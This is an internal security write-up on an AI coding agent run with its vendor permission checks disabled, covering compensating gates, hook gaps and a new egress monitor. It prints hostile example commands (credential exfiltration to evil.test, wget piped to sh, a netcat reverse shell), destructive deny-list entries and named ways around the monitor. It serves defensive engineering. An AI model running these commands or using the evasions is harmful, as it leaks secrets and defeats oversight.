# Agent Vendor Permission Bypass — `--dangerously-skip-permissions`

CUI // SP-CTI

**Task:** exa-bench-04 · **Control:** AC-3 / AC-6 / CM-7 · **ADR:** D394, D395
**Evidence:** `tests/test_skip_permissions_compensating_controls.py`

`tools/agents/adapters/claude_cli.py` invokes Claude Code with
`--dangerously-skip-permissions`. That adapter is `ADAPTER` for the `claude_cli`
executor, it is what the kanban runner dispatches through, and it is first in
the executor chain — so **every autonomous ICDEV build runs with the vendor
permission system disabled.**

Until now that was an incidental flag sitting in a list next to `--max-turns`
and `--output-format json`. This document makes it a stated decision, names what
is given up, names what compensates, and — the part that was missing — reports a
**measured** coverage matrix rather than an assertion that the ICDEV gates
"cover it."

---

## 1. The decision

**Keep the flag.** The adapter's whole purpose is non-interactive dispatch. The
vendor permission system's answer to an unattended prompt is to wait for a human
who is not there; `spawn()` hands the child a temp file on stdin and returns a
`Popen` for the kanban runner's poll/kill loop. A permission prompt in that path
does not make the build safer, it makes it hang until the runner's timeout kills
it — which is a liveness failure that reads as a safety control only until the
first time it fires.

**Consequence accepted:** the vendor prompt is not a control ICDEV has. Nor is
`.claude/settings.json`'s `permissions.deny` list — the permission system is what
evaluates that list, and the flag turns the permission system off. That list
(`rm -rf *`, `git push --force*`, `git reset --hard*`, `DROP TABLE*`, branch and
worktree deletes) is best read as a **precise inventory of what is given up**,
not as a second line of defence.

## 2. What actually observes a tool call — by path

This is the distinction that gets mis-stated most often, including in ICDEV's own
prose, so it is stated first and precisely.

| Execution path | What runs | Controls in the tool-call path |
|---|---|---|
| **In-process agent loop** — Studio `node_type: agent` steps, via `tools/studio/executors/agent_executor.py` | `icdev.tools.llm.agent_loop.run_agent_loop` inside the ICDEV process | `tools/studio/executors/agent_tool_gate.py` (AGENT-WF-001, default-deny, offer time **and** call time) chained to `tools/agent_runtime/approval_gate.py` (ars-appr-01 reversibility) |
| **Spawned vendor CLI** — `claude_cli` adapter, the kanban runner's path | a **separate** `claude` process, `Popen`'d | `.claude/hooks/pre_tool_use.py` only |

`agent_executor.py` is the sole module that calls both `build_gate_hook` and
`build_approval_hook`. `tools/agents/` imports neither — verifiable with
`grep -rn "approval_gate\|agent_tool_gate" tools/agents/`, which returns nothing.
The spawned CLI is a different process that imports no ICDEV module at all.

So: **the two gates usually named as the compensating controls for this flag are
not in this adapter's path.** They are real, they are default-deny, and they are
genuinely stronger than a vendor prompt — for the in-process loop. For the
spawned CLI the only ICDEV code that sees a tool call is the PreToolUse hook, and
`.claude/settings.json` wires that hook as:

```
python $CLAUDE_PROJECT_DIR/.claude/hooks/pre_tool_use.py || true
```

A PreToolUse hook signals "block" with **exit code 2**. `|| true` makes the shell
return 0 regardless. Every hard block that file advertises is therefore advisory
in an interactive session. (The headless path,
`tools/airgap/hook_compat.py::run_pre_tool_check`, has no such wrapper and does
block — the unattended path is the weaker of the two.) That is filed as
`exa-bench-05` and is **not** fixed here: deleting `|| true` converts nine
never-load-tested checks into hard blocks for every concurrent session on the
host at once, so per-check false-positive rates have to be surveyed first.

## 3. Compensating controls, and why they are defensible where they apply

For the in-process loop the ICDEV stack is arguably stronger than the prompt it
replaces, for three reasons that a per-call yes/no prompt does not give you:

1. **Default-deny by name, twice.** `agent_workflow_tools` in
   `args/security_gates.yaml` has `default: deny`. `authorize_toolset` filters at
   offer time so an unauthorized tool is never described to the model, and
   `build_gate_hook` re-checks at call time because "not offered" is a weaker
   claim than "not authorized."
2. **Default-deny by tier.** `args/agent_approval_policy.yaml` sets
   `default_tier: unknown` with `unknown` in `require_approval_tiers`. A tool has
   to be *named* to be automatic. Content patterns may always **escalate** and may
   only **downgrade** for a declared generic executor.
3. **Append-only evidence.** Every decision, allowed and refused, lands in
   `agent_approval_log` / `studio_mcp_dispatch_audit` with actor and reason.
   Argument values are never stored — key names and a SHA-256 only.

A vendor prompt has none of the three: it is per-call, it is not recorded, and it
fails open the moment a human clicks through.

## 4. Measured coverage of the four categories

### What "covered" has to mean

A vendor prompt interposes a human decision **on every call, with the arguments
in front of the approver**. So the bar is *per-call* mediation — and the two
ICDEV layers do not both clear it:

- **`agent_tool_gate` (AGENT-WF-001)** decides by tool **name**. A refusal is
  per call: the tool is never callable. But `requires_approval` parks **one gate
  per `(run, tool)`** — `approval_step_id("write_file")` is
  `approval:agent:write_file` whatever the path, and `await_approval`'s own
  docstring says "an agent that writes ten files asks once."
- **`approval_gate` (ars-appr-01)** decides by name **and flattened content**, on
  every call. This is the layer that can tell `rm -rf /` from `ls` — and the
  layer that, for a path, tells nothing apart at all.

Four mediation strengths result, and only the first two clear the bar:

| Strength | Meaning |
|---|---|
| `refused` | not allowlisted — never offered, never callable |
| `per_call_approval` | content-aware halt on **every** call |
| `per_run_approval_only` | one path-blind human gate for the whole run |
| `unmediated` | no decision at any layer |

### The matrix

Every verdict below is measured, not asserted, and is pinned probe-by-probe in
`tests/test_skip_permissions_compensating_controls.py`.

| Category | Verdict | Strength | What decides it |
|---|---|---|---|
| **Destructive shell** | **COVERED** | `per_call_approval` | Explicit `irreversible` patterns (`rm -rf`, `git reset --hard`, `git clean -dfx`, `DROP TABLE`, `mkfs`, `dd if=`) halt every call; anything else on `run_command` falls to `default_tier: unknown` and halts anyway. |
| **Network egress** | **COVERED — in-process by the default, on the spawned CLI by a real egress rule** | `per_call_approval` / `refused` | *In-process, unchanged:* the `curl`/`wget` pattern only matches `-X POST\|PUT\|DELETE\|PATCH`, `--data`, `-d `. A GET exfil (`curl https://x/?d=secret`) matches **no** pattern — it halts because it lands in `unknown`. `http_post` and `upload_file` are not allowlisted at all, so they are refused outright. *On the spawned CLI (exa-bench-08):* `shared_checks.check_network_egress` models the **destination** and runs in both hook paths. See §4a. |
| **Writes outside the worktree** | **NOT COVERED** | `per_run_approval_only` | `write_file` / `patch_file` are gated by **name**, once per run. Then `approval_gate` auto-allows them — tier `recoverable`, path never examined. So the human who approved `write_file tools/foo.py` also approved `write_file ~/.ssh/authorized_keys`; they were never shown a path. `run_command` with `touch` or `mkdir` matches the `recoverable` **downgrade** pattern and is auto-allowed for any path on the same one-gate-per-run basis. |
| **Credential access** | **NOT COVERED** | `unmediated` | `read_file` is in the AGENT-WF-001 `allowed` list — no gate at all — and is tier `reversible`, where `classify()` rule 0 exempts it from content escalation entirely. **No argument can ever escalate a read**: `read_file('~/.ssh/id_rsa')` classifies identically to `read_file('README.md')`. |

Two things this matrix says that the shorter version got wrong, and which are
worth stating because they are the difference between a real finding and a
scary-sounding one:

- Writes are **not** ungated — they are gated *by name, once per run*. That is a
  meaningfully weaker guarantee than a vendor prompt, not the absence of one.
  `edit_file` and `apply_patch` are in fact refused outright, but only because
  nobody allowlisted those spellings — an accident of naming, not a path policy,
  and it would evaporate the moment someone adds them.
- Egress is covered **in-process** by the fail-closed default, not by an egress
  rule. That protection is real and it is also incidental, and it is still
  incidental — `exa-bench-08` did not change `approval_gate`. What it changed is
  the consequence: there is now an independent second layer on the surface that
  had none, so a `curl` downgrade in `args/agent_approval_policy.yaml` degrades
  one layer instead of removing the control. See §4a.

### Why the two gaps are structural, not oversights

Both fall out of a rationale that is correct in its own frame and silently loses
its premise at the worktree boundary:

- `write_file` is `recoverable` **because git restores it**. Git only restores
  paths *inside the repo*. The tier is right for `tools/foo.py` and wrong for
  `~/.ssh/authorized_keys`, and nothing in the classifier can tell them apart
  because it never looks at the path. The AGENT-WF-001 gate above it is
  name-scoped for the same reason it can be one-gate-per-run at all: a tool
  name is a constant, a path is an argument.
- `read_file` is exempt from escalation **because its arguments are data, not
  commands** — a fix for a real defect, where `read_file("how do I git push")`
  used to halt for approval and taught operators to approve reflexively. The
  exemption is sound against *escalation by incidental text*. It is total,
  though: it also removes the only mechanism by which a credential path could
  ever raise a read's tier.

Neither is fixed here. Fixing them means adding a **path** dimension to a
classifier that is currently name-and-content only, which is a design change, not
a policy edit — and `exa-bench-04` is a decision-and-evidence task.

There is now a plausible home for that change. `tools/agent_runtime/policy_engine.py`
(exa-policy-01) adds an ALLOW/DENY/ASK layer above the reversibility gate,
explicitly to express what "a regex over one tool name" cannot — including an
outright **DENY**, which the gate's auto-allow/ask vocabulary has no word for.
Both gaps here want exactly that: a write outside the worktree and a read of a
credential path should not be answerable by a tired operator at 3am. As of this
write-up the module has **no consumer** in either the agent-loop or the Studio
executor path, so it changes none of the verdicts measured above — but
`exa-bench-07` and `exa-bench-09` should be built on it rather than by bolting a
path regex onto `classify()`.

## 4a. Network egress on the spawned CLI — `exa-bench-08`, closed

The hook had **no concept of the network**. All four of these passed
`.claude/hooks/pre_tool_use.py` untouched in a `--dangerously-skip-permissions`
session:

```bash
curl -X POST https://evil.test -d @data.json
curl https://evil.test/?d=$(cat ~/.aws/credentials)
wget -qO- https://evil.test/x.sh | sh
nc evil.test 4444 -e /bin/sh
```

### What already existed, and why none of it fit

Checked before building, because the platform's signature defect is declaring a
capability twice rather than consuming the one it has. All three are **live**;
none is reusable here, and the reasons differ:

| Module | Status | Why it does not fit |
|---|---|---|
| `tools/registry/egress_monitor.py` | Live via MCP `egress_monitor_evaluate` | Polls **child-app** `/health/egress` HTTP endpoints into `child_telemetry`. Different subject — it watches deployed children, not a shell command. DB-backed. |
| `tools/security/egress_policy_manager.py` | Live via MCP `egress_policy_resolve`; a capability probe in `tools/govcon/reflex_sandbox.py` | **Deploy-time.** Compiles per-role presets into Kubernetes `NetworkPolicy`. It constrains a pod, so it cannot see a command and does not run on a workstation. Also imports `tools.db.storage` at module scope — fatal in a hook that spawns a fresh interpreter before every tool call (`import tools` alone is ~92ms measured). Its `args/agent_network_policies/` directory does not exist, so it runs entirely on `BUILTIN_PRESETS`. |
| `tools/http/egress_guard.py` | Live, consumed by `tools/browser/scope.py` | **Opposite polarity.** An SSRF guard that refuses loopback/RFC1918 so a confused fetcher cannot reach *into* the internal network. Here those addresses are the safe case and public ones are the risk. `scope.py` already skips it for loopback for exactly this reason. It also does blocking DNS per call. |

Reused rather than reinvented: the **destination vocabulary** (`allowed_hosts`
is seeded from `egress_policy_manager`'s `builder` preset, so the two layers
name the same hosts) and `egress_guard`'s **deny-beats-allow, suffix-matched**
precedence.

### What it models

The **destination**, not the program — `shared_checks.check_network_egress`,
configured by `args/agent_egress_policy.yaml`, run by both hook paths. A host
that is neither local nor allowlisted is the finding; the program is a
confidence signal on top. That ordering is the point: a `curl`/`wget` pattern
list is defeated by `python -c "urllib..."` or a raw IP, and both still name a
destination. Two verdicts, deliberately not interchangeable — `egress`
(destination **and** a recognised network program; blockable) and
`destination_only` (destination alone; recorded, never blocked, because an
unrecognised program is precisely the case the check cannot decide).

### Measured fire rate — monitor-only until this was known

Shipped `enforce: false`. Measured over **78,903 real `Bash` calls** from 2,346
local Claude Code transcripts, with
`python tools/security/egress_fire_rate.py --corpus --json`:

| Verdict | Count | Share |
|---|---:|---:|
| clean | 77,417 | 98.12% |
| allowlisted | 1,413 | 1.79% |
| `destination_only` | 0 | 0.00% |
| **`egress`** (would block) | **73** | **0.093%** |

The first pass measured **1.83%**, and the difference is the whole reason to
measure. 1,371 of those 1,440 firings — 95% — were `claude.com`, because this
repo mandates a `https://claude.com/claude-code` attribution footer on every PR
body, so every `gh pr create` carried one. Unallowlisted, that alone would have
made the guard noise and got it switched off. Two further false positives were
extraction bugs the corpus exposed and unit tests would not have: an f-string
interpolation read as the host `{os.environ[chr`, and `from tools.db.storage
import ...` read as a hostname because an ssh-family word appeared elsewhere in
the same command. Both are fixed and pinned.

The residual 0.093% is dominated by **example hostnames inside test fixtures and
documentation** (`example.com`, `evil.test`, `exfil.example`) — the check
correctly seeing exfil-shaped strings in test data — plus a handful of genuine
CDN fetches (`cdn.jsdelivr.net`, `unpkg.com`, `cdnjs.cloudflare.com`) and
`ollama.com`. Re-run the measurement before flipping `enforce: true`.

### Evasion boundary — stated, not implied

A guard whose limits are only claimed in prose gets trusted past them. A shell
command is not statically decidable, and every one of these passes: shell
indirection (`curl "$URL"`, `curl $(cat u.txt)`); encoding (base64, string
concatenation, punycode); a destination that lives in a **second file**
(`python exfil.py`); an **allowlisted carrier** — `github.com` is allowlisted,
so a gist push or a branch of secrets is egress this permits by construction;
non-IP transports (DNS tunnelling, ICMP, an inbound-connected listener); and
anything assembled across two tool calls.

These blind spots are pinned as *passing* tests in
`tests/hooks/test_network_egress.py::TestTheEvasionBoundaryIsReal`, so the
claim is falsifiable rather than decorative. This is a **tripwire with named
blind spots, not a network boundary**. The boundary is
`egress_policy_manager`'s `NetworkPolicy`, at the pod.

## 5. Follow-up tasks — filed, not quietly accepted

All five were already on the board when this write-up landed — they cite "ADR
D394" because they were filed expecting the decision to be written up, which is
what exa-bench-04 does. Nothing here is newly discovered *and* unfiled; the
contribution is the decision, the measurement, and the regression harness.

| Task | Gap | Category |
|---|---|---|
| `exa-bench-05` | `\|\| true` in `.claude/settings.json` makes every `pre_tool_use.py` hard block advisory. Survey per-check false-positive rates before removing it. **Note:** this also bounds `exa-bench-08` — until it lands, an enforcing egress refusal is advisory on the Claude Code path too. | (the hook itself) |
| `exa-bench-07` | No worktree containment on any surface. The AGENT-WF-001 gate is one per `(run, tool)` and path-blind; `approval_gate` holds `write_file` / `patch_file` at `recoverable` for any path; the `touch` / `mkdir` downgrade patterns auto-allow a `run_command` write to any absolute path. | **writes outside the worktree** |
| `exa-bench-09` | Credential-path reads are unclassifiable: rule 0 exempts `read_file` from all content escalation, `read_file` is allowlisted at AGENT-WF-001 with no gate, and the `file_access_tiers` glob list misses `~/.aws/credentials`, `~/.netrc`, `~/.kube/config` and friends. | **credential access** |

### Closed

| Task | Gap | Closed by |
|---|---|---|
| `exa-bench-08` | The hook had **no egress concept at all**, and in-process coverage rested on `default_tier: unknown` rather than on an egress rule — allowlisting one HTTP tool, or adding a `curl` downgrade pattern, removed it silently. Measured: `curl -X POST https://evil.test -d @data.json`, a `$(cat ~/.aws/credentials)` GET, `wget -qO- ... \| sh` and `nc evil.test 4444 -e /bin/sh` all passed the hook untouched. | `shared_checks.check_network_egress` + `args/agent_egress_policy.yaml`, wired into **both** hook paths. Models the DESTINATION, not the program, so `python -c "urllib..."` and raw IPs are caught too. Shipped **monitor-only**; measured fire rate 0.093% over 78,903 real Bash calls before enforcement is offered. Evasion boundary stated in the docstring and pinned as passing tests. See §4a. |
| `exa-bench-06` | The Claude Code hook ran 9 of the 10 shared checks — `check_git_danger` was in `shared_checks` and in `HEADLESS_CHECKS` but was never called from `main()`. Measured: `git reset --hard origin/main` and `git clean -fdx` were **refused headlessly and allowed** in a Claude Code session. Separately, `_REDIRECT_TARGET_RE` (`>\s*([^\s\|;&]+)`) mis-captured `>>`: the first `>` matched, `\s*` matched nothing, and the capture took the **second** `>`, so `file_path` became the literal `">"`, matched no tier, and `echo k >> ~/.ssh/authorized_keys` was allowed while the single-`>` form of the same command was blocked. | `check_git_danger` wired into `main()` at the same position `HEADLESS_CHECKS` runs it; `_REDIRECT_TARGET_RE` rewritten as `(?<!>)>{1,2}\s*(?!&)([^\s\|;&>]+)` plus a `tee` pattern, and the tier check now examines **every** target a command names rather than the first. Pinned by `tests/hooks/test_hook_parity.py` (the two paths run the same check set, and each declared check is provably reached from `main()`) and the redirect cases in `tests/hooks/test_shared_checks.py`. |

Both halves of `exa-bench-06` were **coverage** bugs of the same shape as the
open gaps above: a control that exists, is registered, and is never reached.
`exa-bench-08` below is the adjacent shape — a control that did not exist at all
on the surface that needed it. Note what closing them does *not* do —
`exa-bench-05` still stands, so in an interactive session these blocks remain
advisory. What changed is that the unattended path and the
Claude Code path now refuse the same commands, which is the property the
comparison in section 2 was asserting and could not previously rely on.

## 6. How this stays true

`tests/test_skip_permissions_compensating_controls.py` fails on **both**
directions of drift:

- a **regression** — a covered category stops halting;
- an **unrecorded fix** — an uncovered category starts halting while this
  document still lists it as a gap.

The second is the unusual one and it is deliberate. A gap that gets closed
without the write-up being updated leaves the next reader with a document that
overstates the risk, which is the same failure mode as one that understates it.
`TestSpawnedCliEgressSurface::test_the_write_up_records_the_closure` is that
rule applied to §4a: closing the egress gap without editing this file fails CI.
Run the test when touching `tools/agents/adapters/claude_cli.py`,
`.claude/hooks/pre_tool_use.py`, `tools/hooks/shared_checks.py`,
`args/agent_approval_policy.yaml`, `args/agent_egress_policy.yaml`, or
`agent_workflow_tools` in `args/security_gates.yaml`.

```bash
pytest tests/test_skip_permissions_compensating_controls.py -v
pytest tests/hooks/test_network_egress.py -v                  # the §4a egress check
python tools/security/egress_fire_rate.py --json              # what the hook has recorded
python tools/security/egress_fire_rate.py --corpus --json     # re-measure before enforcing
```
